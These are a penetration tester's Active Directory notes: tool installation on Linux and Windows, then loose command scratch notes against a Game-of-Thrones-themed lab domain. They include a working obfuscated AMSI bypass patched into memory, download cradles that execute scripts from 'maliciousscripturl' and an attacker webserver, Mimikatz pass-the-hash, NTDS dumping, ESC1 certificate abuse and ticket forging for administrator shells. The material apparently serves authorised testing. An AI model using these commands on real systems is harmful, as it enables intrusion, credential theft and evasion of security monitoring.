#  Linux Environment

For consultants working on a Linux platform, this section is crucial. We will cover how to install various tools necessary for pentesting Active Directory:

### **Bloodhound Installation**: 
Neo4j installation 4.4.0 is only supported for Bloodhound
```
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable 4.4' | sudo tee /etc/apt/sources.list.d/neo4j.list
sudo apt-get update
sudo apt-get install neo4j=1:4.4.0

https://www.openlogic.com/openjdk-downloads?field_java_parent_version_target_id=406&field_operating_system_target_id=All&field_architecture_target_id=All&field_java_package_target_id=All
sudo dpkg -i java11.deb 
```

### Bloodhound setup
```
Grab the latest bloodhound release from https://github.com/BloodHoundAD/BloodHound/releases and run it with the following commands: 

sudo neo4j console &!

First time running neo4j you need to set a password by going to https://localhost:7474/ in a browser
This password and user (neo4j) is then entered once you start bloodhound: 

Prepare custom queries:
curl -o ~/.config/bloodhound/customqueries.json "https://raw.githubusercontent.com/CompassSecurity/BloodHoundQueries/master/BloodHound_Custom_Queries/customqueries.json"

./BloodHound --no-sandbox

Now simply drag and drop the zip file or upload it via GUI to view the collected data and apply the custom queries to discover attacks.
```

### Bloodhound Ingestor
Now we need to install a Bloodhound ingestor to collect the data to find attack paths in bloodhound:
#### `pipx install bloodhound`

### **Nmap** & Rustscan: 
#### `sudo apt install nmap`
https://github.com/RustScan/RustScan/wiki/Installation-Guide

### Active Directory Certificate Services:
#### `pipx install certipy-ad`

### Impacket tooling
#### `pipx install impacket`

### Netexec
```
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

### LDAP 
#### `pip3 install git+https://github.com/franc-pentest/ldeep`

### Force Authentication
#### `pipx install coercer`


# Windows Environment

For Consultants working on a Windows platform, this section guides you through two common client scenarios:

## Scenario 1: Windows Workstation
For security assessments its common to receive a workstation just like a regular client employee would get as a new hire. 

### **RSAT Module**: 
https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools#download-locations-for-rsat
The remote server administration tooling is great to install on the provided workstation, this requires local administrative rights.
If local administrative rights are not available a DLL from a server with RSAT installed can be moved on to the workstation.
#### `Import-Module .\Microsoft.ActiveDirectory.Management.dll`
#### `Add-WindowsFeature RSAT-AD-Powershell`

### Powershell
Prepare for the usage of PowerView and PowerUpSQL. In order to execute the powershell tools you will need to disable the execution policy in the registry and bypass amsi: 
#### `Set-ExecutionPolicy -ExecutionPolicy bypass -Scope Currentuser -Force`

Next load a amsi bypass followed by PowerView and PowerUpSQL with the help of a powershell download cradle, here are some examples:

```
$Url = 'https://iptoyourwebserver/amsi-bypasses/1.txt'; $Username = ''; $Password = 'VinterICity'; $WebClient = New-Object System.Net.WebClient; $WebClient.Headers['Authorization'] = 'Basic ' + [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("$Username`:$Password")); IEX($WebClient.DownloadString($Url))
```
#### `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`
This is useful for TLS error on older windows machines and after executing it in downloadstring can be used. 

#### `IEX([Net.Webclient]::new().DownloadString("https://maliciousscripturl/malicious.ps1"))`
Download a script straight into powershell memory. 
### AMSI Bypasses
Here is a basic amsi bypass that can be used with downloadstring and download all 3 examples below into powershell when the 3.txt is downloaded amsi is bypasses:
#### `IEX([Net.Webclient]::new().DownloadString("https://maliciousscripturl/1.txt"))`
```
cat 1.txt 

$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@


    
cat 2.txt

Add-Type $ZQCUW

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)

cat 3.txt 

[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```
To confirm AMSI is shutoff you can type amsiscanbuffer in the powershell session.  If an error message appears stating that this is not a recognized command, then you've successfully disabled AMSI.

In order to streamline your process, create a script that can download all three .txt into the same PowerShell session one by one.

## Scenario 2: Windows VM
Sometimes client only provide VPN credentials and  a Windows VM is needed to interact with the domain, without being domain-joined.
In the VMs IPV4 settings the domains Domain controller needs to be put as primary DNS. 

### Domain Interaction
After setting the Domain controller as your VMs DNS to interact with the domain run the following:
#### `runas /netonly /user:DOMAIN\User1 cmd.exe`

Verify you have valid domain authentication using the net binary.
#### `net view domain `

### Bonus Quality of Life Trick:

1. Generate an NTLM hash in a linux terminal to PTH with Mimikatz:
#### `echo -n 'PAssw+rd!' | iconv -t UTF-16LE | openssl md4`

2. Use the following command with mimikatz:
Create a CMD with the context of the NT hash from the user. This will allow you to interact with the domain much easier.
#### `sekurlsa:pth /user:samaccountname /domain:domainname /dc:dcfqdn /ntlm:string`














nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10

# /etc/hosts
# GOAD
192.168.56.10   sevenkingdoms.local kingslanding.sevenkingdoms.local kingslanding
192.168.56.11   winterfell.north.sevenkingdoms.local north.sevenkingdoms.local winterfell
192.168.56.12   essos.local meereen.essos.local meereen
192.168.56.22   castelblack.north.sevenkingdoms.local castelblack
192.168.56.23   braavos.essos.local braavos


curl -s https://www.hbo.com/game-of-thrones/cast-and-crew | grep 'href="/game-of-thrones/cast-and-crew/'| grep -o 'aria-label="[^"]*"' | cut -d '"' -f 2 | awk '{if($2 == "") {print tolower($1)} else {print tolower($1) "." tolower($2);} }' > got_users.txt


sql_svc
jeor.mormont
samwell.tarly
jon.snow
hodor
rickon.stark
brandon.stark
sansa.stark
robb.stark
catelyn.stark
eddard.stark
arya.stark
krbtgt
vagrant
Guest
Administrator

cme smb winterfell.north.sevenkingdoms.local -u pnightmare2 -p 'Test123456789!' --ntds

cme ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ


bloodhound-python --zip -c All -d sevenkingdoms.local -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople -dc kingslanding.sevenkingdoms.local



[libdefaults]
  default_realm = essos.local
  kdc_timesync = 1
  ccache_type = 4
  forwardable = true
  proxiable = true
  fcc-mit-ticketflags = true
[realms]
  north.sevenkingdoms.local = {
      kdc = winterfell.north.sevenkingdoms.local
      admin_server = winterfell.north.sevenkingdoms.local
  }
  sevenkingdoms.local = {
      kdc = kingslanding.sevenkingdoms.local
      admin_server = kingslanding.sevenkingdoms.local
  }
  essos.local = {
      kdc = meereen.essos.local
      admin_server = meereen.essos.local
  }



esc1

certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.3.12


certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local

certipy auth -pfx administrator.pfx -dc-ip 192.168.3.12


test_part 


export KRB5CCNAME=/workspace/certifried/meereen.ccache
python3 /opt/tools/myimpacket/examples/getST.py -self -impersonate 'administrator' -altservice 'CIFS/meereen.essos.local' -k -no-pass -dc-ip 'meereen.essos.local' 'essos.local'/'meereen'


export KRB5CCNAME=/workspace/certifried/administrator@CIFS_meereen.essos.local@ESSOS.LOCAL.ccache
wmiexec.py -k @meereen.essos.local

export KRB5CCNAME=/workspace/certifried/meereen.ccache
python3 /opt/tools/myimpacket/examples/getST.py -self -impersonate 'administrator' -altservice 'HTTP/meereen.essos.local' -k -no-pass -dc-ip 'meereen.essos.local' 'essos.local'/'meereen'

export KRB5CCNAME=/workspace/certifried/administrator@HTTP_meereen.essos.local@ESSOS.LOCAL.ccache
evil-winrm -i meereen.essos.local -r ESSOS.LOCAL




